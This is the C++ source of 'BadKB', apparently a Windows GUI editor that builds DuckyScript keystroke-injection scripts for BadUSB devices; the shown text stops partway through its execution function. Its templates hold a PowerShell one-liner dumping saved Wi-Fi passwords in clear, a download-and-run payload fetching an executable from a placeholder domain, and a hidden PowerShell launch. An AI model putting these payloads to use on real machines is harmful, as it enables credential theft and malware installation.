#include "imgui.h"
#include "imgui_internal.h"
#include "imgui_impl_glfw.h"
#include "imgui_impl_opengl3.h"
#include <GLFW/glfw3.h>
#include "GLFW/glfw3native.h"
#define NOMINMAX
#include <windows.h>
#include <dwmapi.h>
#ifndef DWMWA_WINDOW_CORNER_PREFERENCE
#define DWMWA_WINDOW_CORNER_PREFERENCE 33
#define DWMWCP_ROUND 2
#endif
#include <gl/GL.h>
#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

typedef ptrdiff_t GLsizeiptr;
typedef ptrdiff_t GLintptr;
typedef char GLchar;

#define GL_FUNC(ret, name, ...) typedef ret (APIENTRY* PFN_##name)(__VA_ARGS__); static PFN_##name name
GL_FUNC(void,  glAttachShader,             GLuint, GLuint);
GL_FUNC(void,  glBindBuffer,               GLenum, GLuint);
GL_FUNC(void,  glBindVertexArray,          GLuint);
GL_FUNC(void,  glBufferData,               GLenum, GLsizeiptr, const void*, GLenum);
GL_FUNC(void,  glBufferSubData,            GLenum, GLintptr, GLsizeiptr, const void*);
GL_FUNC(void,  glCompileShader,            GLuint);
GL_FUNC(GLuint,glCreateProgram,            void);
GL_FUNC(GLuint,glCreateShader,             GLenum);
GL_FUNC(void,  glDeleteBuffers,            GLsizei, const GLuint*);
GL_FUNC(void,  glDeleteProgram,            GLuint);
GL_FUNC(void,  glDeleteShader,             GLuint);
GL_FUNC(void,  glDeleteVertexArrays,       GLsizei, const GLuint*);
GL_FUNC(void,  glDetachShader,             GLuint, GLuint);
GL_FUNC(void,  glEnableVertexAttribArray,  GLuint);
GL_FUNC(void,  glGenBuffers,               GLsizei, GLuint*);
GL_FUNC(void,  glGenVertexArrays,          GLsizei, GLuint*);
GL_FUNC(void,  glGetProgramInfoLog,        GLuint, GLsizei, GLsizei*, GLchar*);
GL_FUNC(void,  glGetProgramiv,             GLuint, GLenum, GLint*);
GL_FUNC(void,  glGetShaderInfoLog,         GLuint, GLsizei, GLsizei*, GLchar*);
GL_FUNC(void,  glGetShaderiv,              GLuint, GLenum, GLint*);
GL_FUNC(void,  glLinkProgram,              GLuint);
GL_FUNC(void,  glShaderSource,             GLuint, GLsizei, const GLchar**, const GLint*);
GL_FUNC(void,  glUseProgram,               GLuint);
GL_FUNC(void,  glVertexAttribPointer,      GLuint, GLint, GLenum, GLboolean, GLsizei, const void*);
GL_FUNC(void,  glActiveTexture,            GLenum);
GL_FUNC(void,  glBlendFuncSeparate,        GLenum, GLenum, GLenum, GLenum);
GL_FUNC(void,  glBlendEquationSeparate,    GLenum, GLenum);
GL_FUNC(void,  glUniform1i,                GLint, GLint);
GL_FUNC(void,  glUniformMatrix4fv,         GLint, GLsizei, GLboolean, const GLfloat*);
GL_FUNC(const GLubyte*, glGetStringi,      GLenum, GLuint);
#undef GL_FUNC

static void LoadGLFunctions() {
    #define L(name) name = (PFN_##name)wglGetProcAddress("gl" #name)
    L(glAttachShader);L(glBindBuffer);L(glBindVertexArray);L(glBufferData);L(glBufferSubData);
    L(glCompileShader);L(glCreateProgram);L(glCreateShader);L(glDeleteBuffers);L(glDeleteProgram);
    L(glDeleteShader);L(glDeleteVertexArrays);L(glDetachShader);L(glEnableVertexAttribArray);
    L(glGenBuffers);L(glGenVertexArrays);L(glGetProgramInfoLog);L(glGetProgramiv);
    L(glGetShaderInfoLog);L(glGetShaderiv);L(glLinkProgram);L(glShaderSource);L(glUseProgram);
    L(glVertexAttribPointer);L(glActiveTexture);L(glBlendFuncSeparate);L(glBlendEquationSeparate);
    L(glUniform1i);L(glUniformMatrix4fv);L(glGetStringi);
    #undef L
}

#include <string>
#include <vector>
#include <deque>
#include <map>
#include <fstream>
#include <algorithm>
#include <cctype>
#include <thread>
#include <chrono>

// ════════════ Theme ════════════
static void SetupFlopwareTheme() {
    auto& s = ImGui::GetStyle();
    auto& c = s.Colors;
    s.WindowRounding=8;s.FrameRounding=6;s.GrabRounding=6;s.ScrollbarRounding=6;
    s.FramePadding=ImVec2(8,4);s.ItemSpacing=ImVec2(8,4);s.WindowPadding=ImVec2(10,10);s.Alpha=1.0f;
    ImVec4 bg_b   = ImVec4(0.04f,0.05f,0.08f,1.0f);
    ImVec4 bg_e   = ImVec4(0.06f,0.08f,0.13f,1.0f);
    ImVec4 bg_s   = ImVec4(0.08f,0.10f,0.16f,1.0f);
    ImVec4 ac     = ImVec4(0.39f,0.59f,0.86f,1.0f);
    ImVec4 bo     = ImVec4(0.12f,0.16f,0.23f,1.0f);
    c[ImGuiCol_WindowBg]=bg_b;c[ImGuiCol_ChildBg]=bg_b;c[ImGuiCol_PopupBg]=bg_e;
    c[ImGuiCol_Border]=bo;c[ImGuiCol_BorderShadow]=ImVec4(0,0,0,0);
    c[ImGuiCol_FrameBg]=bg_s;c[ImGuiCol_FrameBgHovered]=ImVec4(0.10f,0.13f,0.20f,1.0f);
    c[ImGuiCol_FrameBgActive]=ImVec4(0.12f,0.15f,0.22f,1.0f);
    c[ImGuiCol_TitleBg]=bg_e;c[ImGuiCol_TitleBgActive]=bg_e;c[ImGuiCol_TitleBgCollapsed]=bg_e;
    c[ImGuiCol_MenuBarBg]=bg_e;c[ImGuiCol_ScrollbarBg]=bg_b;
    c[ImGuiCol_ScrollbarGrab]=ImVec4(0.15f,0.18f,0.28f,1.0f);
    c[ImGuiCol_ScrollbarGrabHovered]=ImVec4(0.20f,0.24f,0.35f,1.0f);
    c[ImGuiCol_ScrollbarGrabActive]=ImVec4(0.25f,0.30f,0.42f,1.0f);
    c[ImGuiCol_CheckMark]=ac;c[ImGuiCol_SliderGrab]=ac;c[ImGuiCol_SliderGrabActive]=ImVec4(0.50f,0.69f,1.0f,1.0f);
    c[ImGuiCol_Button]=bg_s;c[ImGuiCol_ButtonHovered]=ImVec4(0.10f,0.13f,0.22f,1.0f);c[ImGuiCol_ButtonActive]=ac;
    c[ImGuiCol_Header]=bg_s;c[ImGuiCol_HeaderHovered]=ImVec4(0.10f,0.13f,0.22f,1.0f);
    c[ImGuiCol_HeaderActive]=ImVec4(0.12f,0.16f,0.26f,1.0f);
    c[ImGuiCol_Separator]=bo;c[ImGuiCol_ResizeGrip]=ImVec4(0.15f,0.20f,0.28f,1.0f);
    c[ImGuiCol_ResizeGripHovered]=ImVec4(0.20f,0.26f,0.36f,1.0f);c[ImGuiCol_ResizeGripActive]=ac;
    c[ImGuiCol_Tab]=bg_s;c[ImGuiCol_TabHovered]=ImVec4(0.10f,0.14f,0.24f,1.0f);
    c[ImGuiCol_TabActive]=ImVec4(0.12f,0.16f,0.28f,1.0f);
    c[ImGuiCol_Text]=ImVec4(0.85f,0.89f,0.97f,1.0f);c[ImGuiCol_TextDisabled]=ImVec4(0.42f,0.48f,0.60f,1.0f);
    c[ImGuiCol_TextSelectedBg]=ImVec4(ac.x,ac.y,ac.z,0.35f);
    c[ImGuiCol_DragDropTarget]=ImVec4(ac.x,ac.y,ac.z,0.50f);c[ImGuiCol_NavHighlight]=ac;
}

static ImFont* g_MonoFont = nullptr;
static GLuint   g_DuckTex = 0;
static int      g_DuckW = 0, g_DuckH = 0;

// ════════════ Action ════════════
struct Action { std::string type; std::string value; };

static std::vector<Action>             g_Actions;
static int                             g_SelectedIndex = -1;
static std::string                     g_Filename;
static bool                            g_Dirty = false;
static std::deque<std::vector<Action>> g_UndoStack;
static std::deque<std::vector<Action>> g_RedoStack;

static void PushUndo() { g_UndoStack.push_back(g_Actions); g_RedoStack.clear(); if(g_UndoStack.size()>100)g_UndoStack.pop_front(); g_Dirty=true; }

static std::string ActionToLine(const Action& a) {
    const auto& t=a.type; const auto& v=a.value;
    if(t=="REM")return v.empty()?"REM":"REM "+v;
    if(t=="DELAY")return"DELAY "+(v.empty()?"100":v);
    if(t=="DEFAULT_DELAY")return"DEFAULT_DELAY "+(v.empty()?"100":v);
    if(t=="STRING")return v.empty()?"STRING":"STRING "+v;
    if(t=="STRINGLN")return v.empty()?"STRINGLN":"STRINGLN "+v;
    if(t=="ENTER")return"ENTER";if(t=="TAB")return"TAB";
    if(t=="REPEAT")return"REPEAT "+(v.empty()?"1":v);
    if(t=="KEY")return v;if(t=="MODIFIER")return v;
    if(t=="LED")return v.empty()?"LED":"LED_"+v;
    if(t=="HOLD")return v.empty()?"HOLD":"HOLD "+v;
    if(t=="RELEASE")return v.empty()?"RELEASE":"RELEASE "+v;
    return"STRING "+v;
}
static std::string GenerateScript(){ std::string o; for(auto&a:g_Actions){if(!o.empty())o+="\n";o+=ActionToLine(a);} return o; }

// ════════════ Templates ════════════
struct TemplateInfo { std::string name; std::vector<Action> actions; };
static std::vector<TemplateInfo> g_Templates={
    {"WiFi Grabber",{{"REM","WiFi Grabber"},{"DELAY","1000"},{"MODIFIER","GUI r"},{"DELAY","500"},{"STRING","powershell"},{"ENTER",""},{"DELAY","3000"},{"STRING","$wifi=(netsh wlan show profiles)|Select-String '\\:(.+)$'|%{$name=$_.Matches.Groups[1].Value.Trim()};netsh wlan show profile name=\"$name\" key=clear|Select-String 'Key Content\\W+\\:(.+)$'|%{$pass=$_.Matches.Groups[1].Value.Trim()};[PSCustomObject]@{SSID=$name;PASS=$pass}|Out-String > $env:TEMP\\w.txt;exit"},{"ENTER",""},}},
    {"Download & Execute",{{"REM","Download and run remote executable"},{"DELAY","1000"},{"MODIFIER","GUI r"},{"DELAY","500"},{"STRING","powershell"},{"ENTER",""},{"DELAY","3000"},{"STRING","Invoke-WebRequest -Uri 'https://yourdomain.com/yourfile.exe' -OutFile \"$env:TEMP\\payload.exe\""},{"ENTER",""},{"DELAY","3000"},{"STRING","Start-Process \"$env:TEMP\\payload.exe\""},{"ENTER",""},{"STRING","exit"},{"ENTER",""},}},
    {"Open Website",{{"REM","Open a website"},{"MODIFIER","GUI r"},{"DELAY","500"},{"STRING","https://google.com"},{"ENTER",""}}},
    {"Spawn Shell",{{"REM","Open PowerShell hidden"},{"MODIFIER","GUI r"},{"DELAY","500"},{"STRING","powershell -w h"},{"ENTER",""}}},
    {"Lock Machine",{{"REM","Lock the workstation"},{"MODIFIER","GUI l"}}},
    {"Hello World",{{"REM","Type Hello World into Notepad"},{"MODIFIER","GUI r"},{"DELAY","300"},{"STRING","notepad"},{"ENTER",""},{"DELAY","1000"},{"STRING","Hello World from BadKB!"}}},
};

// ════════════ Palette ════════════
struct PaletteItem { std::string label,type,value,tooltip; };
struct PaletteGroup { std::string name; std::vector<PaletteItem> items; };
static std::vector<PaletteGroup> g_Palette={
    {"Comments & Meta",{
        {"REM  Comment","REM","","Add a comment line (visible only in the script, not executed)"},
        {"DEFAULT_DELAY","DEFAULT_DELAY","100","Set the default delay between all subsequent commands (ms)"},
    }},
    {"Timing",{
        {"DELAY 100ms","DELAY","100","Wait 100 milliseconds before the next command"},
        {"DELAY 500ms","DELAY","500","Wait half a second"},
        {"DELAY 1000ms","DELAY","1000","Wait 1 second"},
        {"DELAY 3000ms","DELAY","3000","Wait 3 seconds"},
        {"DELAY 5000ms","DELAY","5000","Wait 5 seconds"},
        {"DELAY Custom...","DELAY","","Enter a custom delay in milliseconds"},
    }},
    {"Text Input",{
        {"STRING ...","STRING","","Type the given text character by character"},
        {"STRINGLN ...","STRINGLN","","Type the text and press Enter at the end"},
    }},
    {"Navigation",{
        {"ENTER","ENTER","","Press the Enter / Return key"},
        {"TAB","TAB","","Press the Tab key"},
        {"ESCAPE","KEY","ESCAPE","Press the Escape key"},
        {"SPACE","KEY","SPACE","Press the Space bar"},
        {"BACKSPACE","KEY","BACKSPACE","Press Backspace (delete left)"},
        {"DELETE","KEY","DELETE","Press Delete (delete right)"},
        {"HOME","KEY","HOME","Go to the start of the current line"},
        {"END","KEY","END","Go to the end of the current line"},
    }},
    {"Arrow Keys",{
        {"UP","KEY","UP","Move cursor up"},{"DOWN","KEY","DOWN","Move cursor down"},
        {"LEFT","KEY","LEFT","Move cursor left"},{"RIGHT","KEY","RIGHT","Move cursor right"},
    }},
    {"Modifiers",{
        {"GUI (Windows key)","MODIFIER","GUI","Press and release the Windows key"},
        {"GUI r","MODIFIER","GUI r","Win+R — Open the Run dialog"},
        {"GUI d","MODIFIER","GUI d","Win+D — Show/hide desktop"},
        {"GUI l","MODIFIER","GUI l","Win+L — Lock the workstation"},
        {"GUI e","MODIFIER","GUI e","Win+E — Open File Explorer"},
        {"CTRL c","MODIFIER","CTRL c","Ctrl+C — Copy"},
        {"CTRL v","MODIFIER","CTRL v","Ctrl+V — Paste"},
        {"CTRL a","MODIFIER","CTRL a","Ctrl+A — Select all"},
        {"CTRL z","MODIFIER","CTRL z","Ctrl+Z — Undo"},
        {"ALT F4","MODIFIER","ALT F4","Alt+F4 — Close the active window"},
        {"ALT TAB","MODIFIER","ALT TAB","Alt+Tab — Switch between windows"},
        {"CTRL SHIFT ESC","MODIFIER","CTRL SHIFT ESCAPE","Ctrl+Shift+Esc — Open Task Manager"},
        {"SHIFT TAB","MODIFIER","SHIFT TAB","Shift+Tab — Tab backwards"},
    }},
    {"Function Keys",{
        {"F1","KEY","F1",""},{"F2","KEY","F2",""},{"F3","KEY","F3",""},{"F4","KEY","F4",""},
        {"F5","KEY","F5",""},{"F6","KEY","F6",""},{"F7","KEY","F7",""},{"F8","KEY","F8",""},
        {"F9","KEY","F9",""},{"F10","KEY","F10",""},{"F11","KEY","F11",""},{"F12","KEY","F12",""},
    }},
    {"Advanced",{
        {"REPEAT 3x","REPEAT","3","Repeat the NEXT command 3 times. Only affects the single command immediately after it."},
        {"REPEAT 10x","REPEAT","10","Repeat the next command 10 times"},
        {"REPEAT Custom...","REPEAT","","Enter how many times to repeat the next command"},
        {"LED CAPSLOCK","LED","CAPSLOCK","Toggle the Caps Lock LED (no key press, visual indicator only)"},
        {"LED NUMLOCK","LED","NUMLOCK","Toggle the Num Lock LED"},
        {"HOLD key","HOLD","","Hold down a key until RELEASE is called. Enter the key name (e.g. 'CTRL', 'GUI', 'a')"},
        {"RELEASE key","RELEASE","","Release a key that was previously held with HOLD"},
    }},
};

// ════════════ Docs ════════════
static bool g_DocsOpen = false;
static void ShowDocsWindow() {
    if(!g_DocsOpen)return;
    ImGui::SetNextWindowSize(ImVec2(550,500),ImGuiCond_FirstUseEver);
    if(ImGui::Begin("Documentation",&g_DocsOpen)){
        if(ImGui::CollapsingHeader("Getting Started",ImGuiTreeNodeFlags_DefaultOpen)){
            ImGui::TextWrapped("BadKB generates DuckyScript-compatible scripts for BadUSB/BadKB devices (Flipper Zero, Hak5 Rubber Ducky, etc.).");
            ImGui::TextWrapped("Build your script by clicking actions in the Palette panel or dragging them onto the Canvas. Every action becomes one line of DuckyScript.");
            ImGui::TextWrapped("The Preview panel shows the generated script. Save it as a .txt file and load it onto your device.");
            ImGui::TextWrapped("Project made and developed by WhatAVibe.");
        }
        if(ImGui::CollapsingHeader("Command Reference",ImGuiTreeNodeFlags_DefaultOpen)){
            if(ImGui::TreeNode("REM — Comment")){
                ImGui::TextWrapped("Adds a comment line. Comments are ignored during execution but help document your script. Use them to label sections or explain what the next commands do.");ImGui::TreePop();}
            if(ImGui::TreeNode("DEFAULT_DELAY — Default Delay")){
                ImGui::TextWrapped("Sets the default delay between ALL subsequent commands. After this, every STRING, ENTER, TAB, etc. will automatically wait this many milliseconds before executing the next command. The default is usually 0 (no delay). Use this to slow down typing if the target device can't keep up.");ImGui::TreePop();}
            if(ImGui::TreeNode("DELAY — Wait")){
                ImGui::TextWrapped("Pauses execution for the given number of milliseconds. 1000ms = 1 second. Essential for giving the target system time to respond (e.g., waiting for a window to open after pressing GUI+r).");ImGui::TreePop();}
            if(ImGui::TreeNode("STRING — Type Text")){
                ImGui::TextWrapped("Types the given string character by character as if typed on a keyboard. Supports letters, numbers, and most special characters. Does NOT press Enter at the end — use STRINGLN for that, or add a separate ENTER action.");ImGui::TreePop();}
            if(ImGui::TreeNode("STRINGLN — Type + Enter")){
                ImGui::TextWrapped("Same as STRING but automatically presses Enter after typing. Useful for entering text into a dialog and submitting it in one step.");ImGui::TreePop();}
            if(ImGui::TreeNode("ENTER, TAB, ESCAPE, etc. — Key Presses")){
                ImGui::TextWrapped("Presses a single key. These are the basic navigation keys. ENTER confirms dialogs/submits forms. TAB moves between fields. ESCAPE cancels dialogs. SPACE types a space. BACKSPACE deletes the character to the left. DELETE deletes the character to the right.");ImGui::TreePop();}
            if(ImGui::TreeNode("Arrow Keys")){
                ImGui::TextWrapped("UP, DOWN, LEFT, RIGHT — move the cursor or navigate menus. In a text field they move the cursor. In a menu they select items.");ImGui::TreePop();}
            if(ImGui::TreeNode("Modifiers — Key Combinations")){
                ImGui::TextWrapped("Modifier keys (GUI/Win, CTRL, ALT, SHIFT) are combined with another key to perform shortcuts. GUI = Windows key. The action holds the modifier(s), presses the key, then releases in reverse order.");
                ImGui::TextWrapped("GUI r = Win+R (Run dialog). CTRL c = Copy. ALT F4 = Close window. CTRL SHIFT ESC = Task Manager. Multiple modifiers can be combined with spaces between them.");ImGui::TreePop();}
            if(ImGui::TreeNode("Function Keys F1-F12")){
                ImGui::TextWrapped("Presses the corresponding function key. F5 is commonly Refresh. F2 is commonly Rename in File Explorer. F11 toggles fullscreen in browsers.");ImGui::TreePop();}
            if(ImGui::TreeNode("REPEAT — Repeat Next Command")){
                ImGui::TextWrapped("THIS IS IMPORTANT: REPEAT only affects the SINGLE command immediately after it. It does NOT repeat everything until the end of the script.");
                ImGui::TextWrapped("Example: REPEAT 3 + STRING 'hello' = types 'hellohellohello'. REPEAT 5 + ENTER = presses Enter 5 times. The repeat count is the value you enter.");ImGui::TreePop();}
            if(ImGui::TreeNode("LED — Toggle Keyboard LEDs")){
                ImGui::TextWrapped("Toggles a keyboard LED light. CAPSLOCK toggles the Caps Lock light. NUMLOCK toggles the Num Lock light. This does NOT change the actual lock state of the key — it only affects the physical LED on the keyboard. Useful for visual feedback during long scripts.");ImGui::TreePop();}
            if(ImGui::TreeNode("HOLD / RELEASE — Hold Keys")){
                ImGui::TextWrapped("HOLD presses and holds a key down. RELEASE lets go of that key. Everything between HOLD and RELEASE will execute while the key is held.");
                ImGui::TextWrapped("Example: HOLD GUI + STRING 'd' = holds Win key, types d (Win+D shows desktop). HOLD CTRL + STRING 'a' + RELEASE CTRL = select all and release.");ImGui::TreePop();}
        }
        if(ImGui::CollapsingHeader("REPEAT Examples")){
            ImGui::TextWrapped("WRONG understanding: REPEAT 3 followed by 3 different actions repeats all 3.");
            ImGui::TextWrapped("CORRECT: REPEAT 3 repeats ONLY the very next action. To repeat multiple actions, add REPEAT before each one you want repeated.");
            ImGui::Separator();
            ImGui::TextWrapped("GOOD: REPEAT 5 -> TAB = presses Tab 5 times");
            ImGui::TextWrapped("GOOD: REPEAT 3 -> STRING 'hello' = types 'hellohellohello'");
            ImGui::TextWrapped("WRONG: REPEAT 3, STRING 'a', ENTER, STRING 'b' = only 'a' repeats 3 times, then Enter once, then 'b' once");
        }
    }
    ImGui::End();
}

// ════════════ Drag payload ════════════
struct DragPayload { std::string type,value; int source_index=-1; };
static int  g_DropInsertPos = -1;
static int  g_DragSourceIdx = -1;         // item being dragged from canvas (-1 = none/palette)
static ImVec4 TypeColor(const std::string& t){
    if(t=="REM")return ImVec4(0.42f,0.48f,0.60f,1.0f);
    if(t=="DELAY"||t=="DEFAULT_DELAY")return ImVec4(0.75f,0.17f,0.98f,1.0f);
    if(t=="STRING"||t=="STRINGLN")return ImVec4(0.00f,0.91f,0.53f,1.0f);
    if(t=="ENTER"||t=="TAB"||t=="KEY")return ImVec4(1.00f,0.67f,0.20f,1.0f);
    if(t=="MODIFIER")return ImVec4(0.39f,0.59f,0.86f,1.0f);
    if(t=="REPEAT")return ImVec4(1.00f,0.30f,0.42f,1.0f);
    return ImVec4(0.42f,0.48f,0.60f,1.0f);
}

// ════════════ File IO ════════════
static void SaveToFile(const std::string& p){ std::ofstream f(p); if(f)f<<GenerateScript(); }
static bool LoadFromFile(const std::string& p){
    std::ifstream f(p); if(!f)return false;
    PushUndo();g_Actions.clear();std::string l;
    while(std::getline(f,l)){while(!l.empty()&&(l.back()=='\r'||l.back()=='\n'))l.pop_back();if(l.empty())continue;
        auto sp=l.find(' ');std::string c=l.substr(0,sp),v=(sp!=std::string::npos)?l.substr(sp+1):"";
        for(auto&ch:c)ch=(char)std::toupper((unsigned char)ch);
        if(c=="REM")g_Actions.push_back({"REM",v});else if(c=="DELAY")g_Actions.push_back({"DELAY",v});
        else if(c=="DEFAULT_DELAY"||c=="DEFAULTDELAY")g_Actions.push_back({"DEFAULT_DELAY",v});
        else if(c=="STRING")g_Actions.push_back({"STRING",v});else if(c=="STRINGLN")g_Actions.push_back({"STRINGLN",v});
        else if(c=="ENTER")g_Actions.push_back({"ENTER",""});else if(c=="TAB")g_Actions.push_back({"TAB",""});
        else if(c=="REPEAT")g_Actions.push_back({"REPEAT",v});
        else if(c.substr(0,4)=="LED_")g_Actions.push_back({"LED",c.substr(4)});
        else if(c=="LED")g_Actions.push_back({"LED",""});else g_Actions.push_back({"STRING",l});
    }g_Filename=p;g_SelectedIndex=-1;g_Dirty=false;return true;
}

// ════════════ Windows ════════════
static bool g_PromptOpen=false; static std::string g_PromptType,g_PromptValue; static char g_PromptBuf[1024]={};
static bool g_EditOpen=false;
static bool g_OpenFileOpen=false,g_SaveFileOpen=false; static char g_FilePathBuf[512]={};

static bool NeedsInput(const std::string& type,const std::string& value){
    return (type=="STRING"||type=="STRINGLN"||type=="REM"||type=="HOLD"||type=="RELEASE")
        || (type=="DELAY"&&value.empty())||(type=="REPEAT"&&value.empty());
}
static void OpenInputPrompt(const std::string& type,const std::string& value){
    g_PromptOpen=true;g_PromptType=type;g_PromptValue=value;g_PromptBuf[0]=0;
}

static void ShowInputWindow(){
    if(!g_PromptOpen)return;
    ImGui::SetNextWindowSize(ImVec2(350,120),ImGuiCond_Appearing);
    ImGui::SetNextWindowPos(ImVec2(ImGui::GetIO().DisplaySize.x*0.5f-175,ImGui::GetIO().DisplaySize.y*0.5f-60),ImGuiCond_Appearing);
    if(ImGui::Begin("Add Action",&g_PromptOpen,ImGuiWindowFlags_NoDocking|ImGuiWindowFlags_NoResize)){
        ImGui::Text("Enter value for %s:",g_PromptType.c_str());
        if(ImGui::IsWindowAppearing())ImGui::SetKeyboardFocusHere();
        if(ImGui::InputText("##prompt",g_PromptBuf,sizeof(g_PromptBuf),ImGuiInputTextFlags_EnterReturnsTrue)){
            PushUndo();g_Actions.push_back({g_PromptType,g_PromptBuf});g_SelectedIndex=(int)g_Actions.size()-1;g_Dirty=true;g_PromptOpen=false;
        }
        ImGui::SetItemDefaultFocus();
        if(ImGui::Button("Add",ImVec2(80,0))){PushUndo();g_Actions.push_back({g_PromptType,g_PromptBuf});g_SelectedIndex=(int)g_Actions.size()-1;g_Dirty=true;g_PromptOpen=false;}
        ImGui::SameLine();if(ImGui::Button("Cancel",ImVec2(80,0)))g_PromptOpen=false;
    }ImGui::End();
}

static void ShowOpenFileWindow(){
    if(!g_OpenFileOpen)return;
    ImGui::SetNextWindowSize(ImVec2(420,120),ImGuiCond_Appearing);
    ImGui::SetNextWindowPos(ImVec2(ImGui::GetIO().DisplaySize.x*0.5f-210,ImGui::GetIO().DisplaySize.y*0.5f-60),ImGuiCond_Appearing);
    if(ImGui::Begin("Open File",&g_OpenFileOpen,ImGuiWindowFlags_NoDocking|ImGuiWindowFlags_NoResize)){
        ImGui::Text("Enter file path to open:");
        if(ImGui::IsWindowAppearing()){g_FilePathBuf[0]=0;ImGui::SetKeyboardFocusHere();}
        if(ImGui::InputText("##ofp",g_FilePathBuf,sizeof(g_FilePathBuf),ImGuiInputTextFlags_EnterReturnsTrue)){if(LoadFromFile(g_FilePathBuf))g_OpenFileOpen=false;}
        ImGui::SetItemDefaultFocus();
        if(ImGui::Button("Open",ImVec2(80,0))){if(LoadFromFile(g_FilePathBuf))g_OpenFileOpen=false;}
        ImGui::SameLine();if(ImGui::Button("Cancel",ImVec2(80,0)))g_OpenFileOpen=false;
    }ImGui::End();
}
static void ShowSaveFileWindow(){
    if(!g_SaveFileOpen)return;
    ImGui::SetNextWindowSize(ImVec2(420,120),ImGuiCond_Appearing);
    ImGui::SetNextWindowPos(ImVec2(ImGui::GetIO().DisplaySize.x*0.5f-210,ImGui::GetIO().DisplaySize.y*0.5f-60),ImGuiCond_Appearing);
    if(ImGui::Begin("Save File",&g_SaveFileOpen,ImGuiWindowFlags_NoDocking|ImGuiWindowFlags_NoResize)){
        ImGui::Text("Enter file path to save:");
        if(ImGui::IsWindowAppearing()){strncpy(g_FilePathBuf,g_Filename.c_str(),sizeof(g_FilePathBuf)-1);g_FilePathBuf[sizeof(g_FilePathBuf)-1]=0;ImGui::SetKeyboardFocusHere();}
        if(ImGui::InputText("##sfp",g_FilePathBuf,sizeof(g_FilePathBuf),ImGuiInputTextFlags_EnterReturnsTrue)){SaveToFile(g_FilePathBuf);g_Filename=g_FilePathBuf;g_Dirty=false;g_SaveFileOpen=false;}
        ImGui::SetItemDefaultFocus();
        if(ImGui::Button("Save",ImVec2(80,0))){SaveToFile(g_FilePathBuf);g_Filename=g_FilePathBuf;g_Dirty=false;g_SaveFileOpen=false;}
        ImGui::SameLine();if(ImGui::Button("Cancel",ImVec2(80,0)))g_SaveFileOpen=false;
    }ImGui::End();
}

static void ShowEditWindow(){
    static char eb[1024]={};
    if(!g_EditOpen)return;
    if(g_SelectedIndex<0||g_SelectedIndex>=(int)g_Actions.size()){g_EditOpen=false;return;}
    auto&a=g_Actions[g_SelectedIndex];
    ImGui::SetNextWindowSize(ImVec2(400,130),ImGuiCond_Appearing);
    ImGui::SetNextWindowPos(ImVec2(ImGui::GetIO().DisplaySize.x*0.5f-200,ImGui::GetIO().DisplaySize.y*0.5f-65),ImGuiCond_Appearing);
    if(ImGui::Begin("Edit Action",&g_EditOpen,ImGuiWindowFlags_NoDocking|ImGuiWindowFlags_NoResize)){
        ImGui::Text("Edit %s:",a.type.c_str());
        if(ImGui::IsWindowAppearing()){strncpy(eb,a.value.c_str(),sizeof(eb)-1);eb[sizeof(eb)-1]=0;ImGui::SetKeyboardFocusHere();}
        if(ImGui::InputText("##ev",eb,sizeof(eb),ImGuiInputTextFlags_EnterReturnsTrue)){PushUndo();a.value=eb;g_EditOpen=false;}
        ImGui::SetItemDefaultFocus();
        if(ImGui::Button("OK",ImVec2(80,0))){PushUndo();a.value=eb;g_EditOpen=false;}
        ImGui::SameLine();if(ImGui::Button("Cancel",ImVec2(80,0)))g_EditOpen=false;
    }ImGui::End();
}

// ════════════ Execute ════════════
static bool g_ExecOpen=false;
static bool g_ScratchTheme=false;
static HWND g_hwnd=nullptr;
static bool g_TitleDragging=false;
static int  g_TitleStartX=0,g_TitleStartY=0,g_TitleWinX=0,g_TitleWinY=0;
static int  g_ExecCountdown=0;
static bool g_ExecRunning=false;
static bool g_ExecAborted=false;

static int KeyToVK(const std::string& k){
    static std::map<std::string,int> m={
        {"ENTER",VK_RETURN},{"TAB",VK_TAB},{"ESCAPE",VK_ESCAPE},{"SPACE",VK_SPACE},
        {"BACKSPACE",VK_BACK},{"DELETE",VK_DELETE},{"HOME",VK_HOME},{"END",VK_END},
        {"UP",VK_UP},{"DOWN",VK_DOWN},{"LEFT",VK_LEFT},{"RIGHT",VK_RIGHT},
        {"GUI",VK_LWIN},{"WINDOWS",VK_LWIN},{"CTRL",VK_CONTROL},{"ALT",VK_MENU},{"SHIFT",VK_SHIFT},
        {"MENU",VK_APPS},{"APP",VK_APPS},
        {"F1",VK_F1},{"F2",VK_F2},{"F3",VK_F3},{"F4",VK_F4},{"F5",VK_F5},
        {"F6",VK_F6},{"F7",VK_F7},{"F8",VK_F8},{"F9",VK_F9},{"F10",VK_F10},
        {"F11",VK_F11},{"F12",VK_F12},
        {"CAPSLOCK",VK_CAPITAL},{"NUMLOCK",VK_NUMLOCK},{"SCROLLLOCK",VK_SCROLL},
        {"PRINTSCREEN",VK_SNAPSHOT},{"PAUSE",VK_PAUSE},{"BREAK",VK_CANCEL},
        {"INSERT",VK_INSERT},{"PAGEUP",VK_PRIOR},{"PAGEDOWN",VK_NEXT},
        {"UPARROW",VK_UP},{"DOWNARROW",VK_DOWN},{"LEFTARROW",VK_LEFT},{"RIGHTARROW",VK_RIGHT},
    };
    auto it=m.find(k);return it!=m.end()?it->second:-1;
}

static void SendKey(int vk,bool down){
    INPUT ip={};ip.type=INPUT_KEYBOARD;ip.ki.wVk=(WORD)vk;
    if(!down)ip.ki.dwFlags=KEYEVENTF_KEYUP;
    SendInput(1,&ip,sizeof(INPUT));
}

static void PressKey(int vk){SendKey(vk,true);SendKey(vk,false);}

static void ExecAction(const Action& a){
    if(g_ExecAborted)return;
    const auto&t=a.type;const auto&v=a.value;
    if(t=="DELAY"){int ms=std::stoi(v.empty()?"100":v);auto end=std::chrono::steady_clock::now()+std::chrono::milliseconds(ms);
        while(std::chrono::steady_clock::now()<end){std::this_thread::sleep_for(std::chrono::milliseconds(10));if(g_ExecAborted)return;}}
    else if(t=="DEFAULT_DELAY"){/*handled in main loop*/}
    else if(t=="STRING"){for(char c:v){if(g_ExecAborted)return;SHORT vk=VkKeyScanA(c);INPUT ip={};ip.type=INPUT_KEYBOARD;
        if((vk>>8)&1){ip.ki.wVk=VK_SHIFT;SendInput(1,&ip,sizeof(INPUT));}
        ip.ki.wVk=vk&0xFF;SendInput(1,&ip,sizeof(INPUT));
        ip.ki.dwFlags=KEYEVENTF_KEYUP;SendInput(1,&ip,sizeof(INPUT));
        if((vk>>8)&1){ip.ki.wVk=VK_SHIFT;ip.ki.dwFlags=KEYEVENTF_KEYUP;SendInput(1,&ip,sizeof(INPUT));}
        std::this_thread::sleep_for(std::chrono::milliseconds(5));}}
